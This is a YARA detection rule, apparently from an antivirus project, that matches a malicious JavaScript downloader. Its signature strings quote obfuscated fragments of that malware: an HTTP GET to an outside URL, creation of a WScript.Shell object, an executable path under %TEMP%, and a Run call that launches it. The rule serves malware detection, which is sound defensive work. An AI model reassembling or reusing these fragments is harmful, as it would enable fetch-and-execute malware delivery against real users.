rule sig_20160401_3e5bff1528e2095d9c307ddff9ead2e7 {
  meta:
    description = "datamaliciousorder - file 20160401_3e5bff1528e2095d9c307ddff9ead2e7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f4524fffc87051c8361ffaa5859587a7d6e4a4994ef28f69c096ba16f52f969e"

  strings:
    $s1  = "SdSk[EevBz](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "var GwWgk = function AgmOy() {return WScript[DsLn](\"WScript\"+\".Shell\");}(), LbHlr = 11;" fullword ascii
    $s3  = "function YtaIsi(JcYq, OxVto){IcXf = IcXf * 1; return JcYq - OxVto;};" fullword ascii
    $s4  = "if (SdSk[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DvNv() {return GwWgk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"GYd0yOPuR.ex\" + \"e\";};" fullword ascii
    $s6  = "function HjdOtc(){return ZfKq + \"\";};" fullword ascii
    $s7  = "function WbtSdk() {return ((PraBhl == true) && (PraBhl == DaNm)) ? 1 : IcXf;};" fullword ascii
    $s8  = "PraBhl = true; " fullword ascii
    $s9  = "function ZwAy(){return DsLn;};" fullword ascii
    $s10 = "function HehGf()" fullword ascii
    $s11 = "function VvWnn(){return 23;};" fullword ascii
    $s12 = "DaNm = true; " fullword ascii
    $s13 = "var PraBhl = false;" fullword ascii
    $s14 = "function FvZb(TdyXfg) {var OqwQcs = (1, 2, 3, 4, 5, TdyXfg); return OqwQcs;};" fullword ascii
    $s15 = "var DaNm = false;" fullword ascii
    $s16 = "var WwaBnd = new this[\"Date\"]();" fullword ascii
    $s17 = "}while (CivHlc);" fullword ascii
    $s18 = "return YtaIsi(GkAkj, CjAbv);" fullword ascii
    $s19 = "var LtJm = false;" fullword ascii
    $s20 = "function WzwYcn(OpwUnx){GwWgk[\"R\"+\"un\"](OpwUnx, IcXf, IcXf);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}